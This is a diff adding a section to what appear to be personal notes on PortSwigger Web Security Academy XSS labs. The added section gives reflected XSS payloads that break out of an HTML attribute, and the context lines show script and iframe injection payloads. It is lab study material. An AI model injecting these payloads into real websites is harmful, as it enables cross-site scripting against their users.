@@ -55,4 +55,13 @@ javascript:alert(1)
 <iframe src="https://0a7700c6030ec6b582e3533b006c00b1.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
 ```
 
+# Reflected XSS into attribute with angle brackets HTML-encoded
+
+```html]
+"><script>alert(1)</script>
+```
+
+The value of the **search** request parameter is copied into the value of an HTML tag attribute which is encapsulated in double quotation marks. The payload **uy0y9"onfocus="alert(1)"autofocus="zkgoa** was submitted in the search parameter.
+
+
 
